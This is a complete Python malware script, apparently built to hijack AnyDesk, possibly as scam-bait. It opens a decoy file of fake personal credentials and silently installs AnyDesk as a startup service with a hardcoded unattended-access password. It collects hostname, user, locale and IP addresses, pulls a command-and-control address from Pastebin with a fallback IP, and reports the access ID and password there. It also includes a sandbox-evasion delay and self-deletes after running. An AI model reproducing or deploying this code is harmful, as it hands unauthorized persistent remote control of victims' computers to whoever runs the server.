#!/usr/bin/env python3
"""
Anytime Payload - AnyDesk Hijacker
Hijacks existing AnyDesk installation for persistent remote access
"""

import subprocess
import sys
import os
import time
import socket
import platform
import json
import threading
from pathlib import Path
from datetime import datetime, timezone

FAKE_PASSWORDS = """bgardner57@yahoo.com
Samantha04!

work email robert.gardner@mavengroup.net
mustFTW!2025

BANK OF AMERICA ONLINE BANKING !!!
username: bob.gardner
password: Murphy2019!
(has 2 factor auth - code is usually 123456 or 000000)

facebook bob.gardner.7314
Samantha04!

Wells Fargo online
user: BGARDNER4782
Murphy#2019
security question = Murphy

Social Security - mySocialSecurity account
bobgardner1957 / Murphy#2019

Medicare.gov login
same as SS account

CVS pharmacy
bobgardner / Samantha04!
prescription ready text alerts

AARP membership # 4382991847
login: bgardner57@yahoo.com / AARP2020

amazon - same as yahoo email

netflix bgardner57@yahoo.com / Netflix$Family
sam knows this one

Xfinity/Comcast
account# 8774 4382 9918 2847
bgardner / Murphy2019!
email: robert.gardner472@sbcglobal.net

Fidelity retirement account
user: BOBGARDNER
password: Fidelity$2018

wifi: NETGEAR73 / Murphy2019!

United MileagePlus# 8847392018
bobgardner1957 / United2020

ebay acct - bgardner47 / Samantha04!

paypal = yahoo login

microsoft acct same as work email

DTE Energy online
acct 2847-3821-9918
bobgardner / DTEaccess2021
"""

ANYDESK_PASSWORD = "secretsauce123"
CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
FALLBACK_IP = "52.21.29.104"
C2_PORT = 8080


def is_dev_mode():
    """Check if running in dev mode"""
    try:
        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
        return os.path.exists(os.path.join(exe_dir, ".dev_mode"))
    except:
        return False


def log(msg):
    """Log only in dev mode"""
    if is_dev_mode():
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def create_decoy():
    """Create and open fake passwords.txt file"""
    try:
        passwords_path = Path.cwd() / "passwords.txt"
        passwords_path.write_text(FAKE_PASSWORDS, encoding="utf-8")
        log(f"Created decoy: {passwords_path}")

        # Open in notepad (non-blocking)
        if sys.platform == "win32":
            subprocess.Popen(["notepad.exe", str(passwords_path)], creationflags=subprocess.DETACHED_PROCESS)
        log("Opened decoy in notepad")
    except Exception as e:
        log(f"Decoy creation failed: {e}")


def find_anydesk():
    """Find AnyDesk.exe using tiered discovery"""
    log("Searching for AnyDesk.exe...")

    # Tier 1: Check running processes
    try:
        result = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq AnyDesk.exe", "/FO", "CSV", "/NH"],
            capture_output=True,
            text=True,
            timeout=2,
        )
        if "AnyDesk.exe" in result.stdout:
            # Get full path using wmic
            wmic_result = subprocess.run(
                ["wmic", "process", "where", "name='AnyDesk.exe'", "get", "ExecutablePath", "/format:list"],
                capture_output=True,
                text=True,
                timeout=2,
            )
            for line in wmic_result.stdout.split("\n"):
                if line.startswith("ExecutablePath="):
                    path = line.split("=", 1)[1].strip()
                    if path and os.path.exists(path):
                        log(f"Found via process: {path}")
                        return path
    except:
        pass

    # Tier 2: Check common paths
    common_paths = [
        Path(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")) / "AnyDesk" / "AnyDesk.exe",
        Path(os.environ.get("ProgramFiles", "C:\\Program Files")) / "AnyDesk" / "AnyDesk.exe",
        Path.home() / "Desktop" / "AnyDesk.exe",
        Path.home() / "Downloads" / "AnyDesk.exe",
        Path.home() / "Documents" / "AnyDesk.exe",
        Path(os.environ.get("APPDATA", "")) / "AnyDesk" / "AnyDesk.exe",
        Path(os.environ.get("LOCALAPPDATA", "")) / "AnyDesk" / "AnyDesk.exe",
        Path(os.environ.get("PUBLIC", "C:\\Users\\Public")) / "Desktop" / "AnyDesk.exe",
        Path(os.environ.get("PUBLIC", "C:\\Users\\Public")) / "Documents" / "AnyDesk.exe",
        Path("C:\\AnyDesk.exe"),
        Path("C:\\Tools\\AnyDesk.exe"),
        Path("C:\\Apps\\AnyDesk.exe"),
        Path("C:\\Programs\\AnyDesk.exe"),
    ]

    for path in common_paths:
        if path.exists():
            log(f"Found via common path: {path}")
            return str(path)

    # Tier 3: Shallow recursive search
    search_dirs = [
        (Path.home() / "Desktop", 2),
        (Path.home() / "Downloads", 2),
        (Path.home() / "Documents", 2),
    ]

    for base_dir, max_depth in search_dirs:
        if not base_dir.exists():
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                depth = len(Path(root).relative_to(base_dir).parts)
                if depth > max_depth:
                    dirs.clear()  # Don't recurse deeper
                    continue
                if "AnyDesk.exe" in files:
                    path = Path(root) / "AnyDesk.exe"
                    log(f"Found via search: {path}")
                    return str(path)
        except:
            pass

    log("AnyDesk.exe not found")
    return None


def get_c2_ip():
    """Fetch C2 IP from Pastebin with fallback"""
    try:
        import urllib.request

        with urllib.request.urlopen(CONFIG_URL, timeout=3) as response:
            ip = response.read().decode("utf-8").strip()
            if ip:
                log(f"Got C2 IP from Pastebin: {ip}")
                return ip
    except Exception as e:
        log(f"Pastebin fetch failed: {e}")

    log(f"Using fallback C2 IP: {FALLBACK_IP}")
    return FALLBACK_IP


def install_anydesk(anydesk_path):
    """Install AnyDesk silently as a service"""
    try:
        install_dir = Path(os.environ.get("ProgramFiles(x86)", "C:\\Program Files (x86)")) / "AnyDesk"
        log(f"Installing AnyDesk to {install_dir}...")

        subprocess.run(
            [anydesk_path, "--install", str(install_dir), "--start-with-win", "--silent"],
            capture_output=True,
            timeout=10,
        )
        time.sleep(2)

        installed_exe = install_dir / "AnyDesk.exe"
        if installed_exe.exists():
            log(f"Installation successful: {installed_exe}")

            # Start the AnyDesk service immediately
            log("Starting AnyDesk service...")
            try:
                subprocess.run([str(installed_exe), "--start-service"], capture_output=True, timeout=5)
                time.sleep(2)
                log("AnyDesk service started")
            except Exception as e:
                log(f"Failed to start service: {e}")

            return str(installed_exe)
        else:
            log("Installation completed but exe not found, using original")
            return anydesk_path
    except Exception as e:
        log(f"Installation failed: {e}, using original")
        return anydesk_path


def set_anydesk_password(anydesk_path, password):
    """Set unattended access password"""
    try:
        log(f"Setting password...")
        proc = subprocess.Popen(
            [anydesk_path, "--set-password"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        proc.communicate(input=f"{password}\n".encode(), timeout=5)
        log("Password set successfully")
        return True
    except Exception as e:
        log(f"Password setting failed: {e}")
        return False


def get_anydesk_id(anydesk_path):
    """Get AnyDesk ID"""
    try:
        log("Getting AnyDesk ID...")
        result = subprocess.run([anydesk_path, "--get-id"], capture_output=True, text=True, timeout=5)
        anydesk_id = result.stdout.strip()

        if (
            anydesk_id
            and len(anydesk_id) >= 8
            and not any(x in anydesk_id.lower() for x in ["error", "fail", "invalid"])
        ):
            log(f"Got AnyDesk ID: {anydesk_id}")
            return anydesk_id
        else:
            log(f"Invalid AnyDesk ID: {anydesk_id}")
            return None
    except Exception as e:
        log(f"Failed to get ID: {e}")
        return None


def gather_intelligence():
    """Gather system intelligence"""
    import locale

    info = {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME", "unknown"),
        "os_version": platform.platform(),
        "timezone": datetime.now(timezone.utc).astimezone().tzname(),
        "timezone_offset": time.timezone / -3600,
        "locale": locale.getdefaultlocale()[0] or "unknown",
        "local_ip": "unavailable",
        "external_ip": "unavailable",
    }

    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        pass

    # Get external IP (with short timeout)
    try:
        import urllib.request

        with urllib.request.urlopen("https://api.ipify.org?format=text", timeout=1) as response:
            info["external_ip"] = response.read().decode("utf-8").strip()
    except:
        pass

    log(f"Intelligence gathered: {info['hostname']} ({info['local_ip']})")
    return info


def report_to_c2(anydesk_id, password, intelligence, execution_time):
    """Report to C2 server"""
    c2_ip = get_c2_ip()
    c2_url = f"http://{c2_ip}:{C2_PORT}/report"

    report = {"id": anydesk_id, "password": password, **intelligence, "execution_time": round(execution_time, 2)}

    log(f"Reporting to {c2_url}...")

    # Try up to 2 times
    for attempt in range(2):
        try:
            import urllib.request

            data = json.dumps(report).encode("utf-8")
            req = urllib.request.Request(c2_url, data=data, headers={"Content-Type": "application/json"})

            with urllib.request.urlopen(req, timeout=2) as response:
                log(f"Report sent successfully (attempt {attempt + 1})")
                return True
        except Exception as e:
            log(f"Report failed (attempt {attempt + 1}): {e}")
            if attempt < 1:
                time.sleep(0.5 * (attempt + 1))

    return False


def self_destruct():
    """Delete the .exe file after a delay"""

    def delete_after_delay():
        time.sleep(3)
        try:
            exe_path = Path(sys.executable)
            if exe_path.exists() and exe_path.suffix == ".exe":
                os.remove(exe_path)
                log(f"Self-destructed: {exe_path}")
        except:
            pass

    thread = threading.Thread(target=delete_after_delay, daemon=True)
    thread.start()


def main():
    """Main payload execution"""
    start_time = time.time()

    try:
        log("=== Anytime Payload Starting ===")

        # Create decoy immediately
        create_decoy()

        # Sandbox evasion
        time.sleep(3)

        # Find AnyDesk
        anydesk_path = find_anydesk()
        if not anydesk_path:
            log("AnyDesk not found, exiting")
            return

        # Install AnyDesk
        anydesk_path = install_anydesk(anydesk_path)

        # Set password
        set_anydesk_password(anydesk_path, ANYDESK_PASSWORD)

        # Get AnyDesk ID
        anydesk_id = get_anydesk_id(anydesk_path)
        if not anydesk_id:
            log("Failed to get AnyDesk ID, exiting")
            return

        # Gather intelligence
        intelligence = gather_intelligence()

        # Calculate execution time
        execution_time = time.time() - start_time

        # Report to C2
        report_to_c2(anydesk_id, ANYDESK_PASSWORD, intelligence, execution_time)

        log(f"=== Payload completed in {execution_time:.2f}s ===")

    except Exception as e:
        log(f"Payload error: {e}")
        if is_dev_mode():
            import traceback

            traceback.print_exc()
    finally:
        # Self-destruct (only in production mode)
        if not is_dev_mode():
            self_destruct()
        else:
            log("Dev mode: skipping self-destruct")
            log("")
            input("Press Enter to exit...")


if __name__ == "__main__":
    main()
